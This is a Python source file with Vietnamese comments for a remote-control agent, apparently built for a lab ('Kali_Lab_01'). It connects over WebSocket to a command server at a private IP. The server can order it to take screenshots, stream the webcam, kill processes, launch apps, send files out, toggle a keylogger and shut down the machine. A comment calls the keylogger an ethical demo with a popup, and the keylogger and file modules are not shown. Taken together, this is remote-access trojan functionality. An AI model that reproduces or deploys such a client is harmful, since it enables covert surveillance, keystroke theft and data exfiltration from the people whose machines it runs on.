import json
import time
import threading
import base64
import io
import websocket  # Thư viện kết nối WebSocket thuần

# Thư viện phục vụ Webcam
import cv2

# Import các hàm chức năng từ thư mục con modules/
from modules.system import get_process_list, kill_process_by_pid, execute_power_cmd
from modules.media import capture_screen_to_base64
from modules.app_control import manage_application
from modules.sandbox import get_sandbox_files, read_file_content
# Import module keylogger mới tách lớp
from modules.keylogger import start_keylogger_module, stop_keylogger_module

MACHINE_NAME = 'Kali_Lab_01'
webcam_streaming = False


def webcam_stream_worker(ws):
    """Luồng phụ chạy độc lập chịu trách nhiệm đọc camera bằng OpenCV và nén ảnh gửi về"""
    global webcam_streaming
    print("🎥 [WEBCAM] Khởi chạy Worker ghi hình...")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("❌ [WEBCAM] Không thể mở thiết bị ghi hình (Webcam)")
        webcam_streaming = False
        return

    while webcam_streaming:
        ret, frame = cap.read()
        if not ret:
            break
        try:
            frame_resized = cv2.resize(frame, (640, 480))
            _, buffer = cv2.imencode('.jpg', frame_resized, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            img_base64 = base64.b64encode(buffer).decode('utf-8')
            payload = {
                "command": "agent_send_webcam",
                "machine_name": MACHINE_NAME,
                "image_base64": img_base64
            }
            if ws.sock and ws.sock.connected:
                ws.send(json.dumps(payload))
        except Exception as e:
            print(f"❌ Lỗi truyền gói tin camera: {e}")
        time.sleep(0.25)
    cap.release()


def on_message(ws, message):
    """Lắng nghe lệnh điều khiển trực tiếp từ FastAPI Backend dội xuống"""
    global webcam_streaming
    
    try:
        data = json.loads(message)
        command = data.get('command')
        data_args = data.get('data', {})

        # 🎯 LUỒNG CHỤP MÀN HÌNH (SCREENSHOT & LIVE STREAM)
        if command == 'take_screenshot':
            base64_image = capture_screen_to_base64()
            if base64_image:
                payload = {
                    "command": "agent_send_screen",
                    "machine_name": MACHINE_NAME,
                    "image_base64": base64_image,
                    "is_static": True
                }
                ws.send(json.dumps(payload))
            return

        # 🎯 LUỒNG QUẢN LÝ TIẾN TRÌNH (TASK MANAGER)
        elif command == 'kill_process':
            pid = data_args.get('pid') if isinstance(data_args, dict) else None
            if pid:
                pid = int(pid)
                if kill_process_by_pid(pid):
                    ws.send(json.dumps({
                        "command": "agent_send_procs",
                        "machine_name": MACHINE_NAME,
                        "processes": get_process_list()
                    }))
            return

        # 🎯 LUỒNG ĐIỀU KHIỂN BẬT/TẮT ỨNG DỤNG WHITELIST
        elif command == 'manage_app':
            action = data_args.get('action')
            app_name = data_args.get('app_name')
            manage_application(action, app_name)
            return

        # 🎯 LUỒNG ĐIỀU KHIỂN THIẾT BI GHI HÌNH WEBCAM
        elif command == 'get_webcam_frame':
            if not webcam_streaming:
                webcam_streaming = True
                threading.Thread(target=webcam_stream_worker, args=(ws,), daemon=True).start()
            return

        elif command == 'stop_webcam_stream':
            webcam_streaming = False
            return

        # 🎯 LUỒNG TRUY XUẤT DANH SÁCH TỆP TIN (FILE SANDBOX)
        elif command == 'list_directory':
            files = get_sandbox_files()
            ws.send(json.dumps({
                "command": "agent_send_files",
                "machine_name": MACHINE_NAME,
                "files": files
            }))
            return

        # 🎯 LUỒNG TRÍCH XUẤT NỘI DUNG FILE ĐỂ TẢI VỀ WEB
        elif command == 'read_file_content':
            file_title = data_args.get('file_name')
            file_payload = read_file_content(file_title)
            if file_payload:
                ws.send(json.dumps({
                    "command": "agent_download_ready",
                    "machine_name": MACHINE_NAME,
                    "file_name": file_payload["file_name"],
                    "file_base64": file_payload["file_base64"]
                }))
            return

        # 🎯 LUỒNG KIỂM SOÁT PHÍM BẤM THỰC HÀNH (KEYLOGGER DEMO CHUẨN ĐẠO ĐỨC)
        elif command == 'toggle_keylogger':
            capturing = data_args.get('capturing', True)
            if capturing:
                # Gọi hàm module kích hoạt bảng popup và bật listener
                start_keylogger_module(ws, MACHINE_NAME)
            else:
                # Gọi hàm module cưỡng bức dừng bắt phím và xóa popup
                stop_keylogger_module()
            return

        # 🎯 LUỒNG ĐIỀU KHIỂN NGUỒN HỆ THỐNG
        elif command in ['shutdown', 'restart']:
            execute_power_cmd(command.upper())

    except Exception as e:
        print(f"❌ Lỗi xử lý hoặc phân tích bản tin JSON: {e}")


def on_open(ws):
    print(f"✅ [CONNECTED] Đã thông nòng kết nối WebSocket tới FastAPI! Tên máy: {MACHINE_NAME}")
    ws.send(json.dumps({"event": "agent_register", "machine_name": MACHINE_NAME}))


def on_close(ws, close_status_code, close_msg):
    global webcam_streaming
    print("❌ [DISCONNECTED] Mất kết nối tới Server Backend. Hủy toàn bộ luồng phụ.")
    webcam_streaming = False
    stop_keylogger_module()


if __name__ == '__main__':
    BACKEND_WS_URL = f"ws://192.168.89.134:8000/ws/agent/{MACHINE_NAME}"

    ws_client = websocket.WebSocketApp(
        BACKEND_WS_URL,
        on_open=on_open,
        on_message=on_message,
        on_close=on_close
    )

    # Luồng chạy ngầm độc lập gửi thông số Task Manager định kỳ (5 giây / lần)
    def sys_monitor_loop():
        while True:
            try:
                if ws_client.sock and ws_client.sock.connected:
                    ws_client.send(json.dumps({
                        "command": "agent_send_procs",
                        "machine_name": MACHINE_NAME,
                        "processes": get_process_list()
                    }))
            except Exception:
                pass
            time.sleep(5)

    threading.Thread(target=sys_monitor_loop, daemon=True).start()
    ws_client.run_forever()
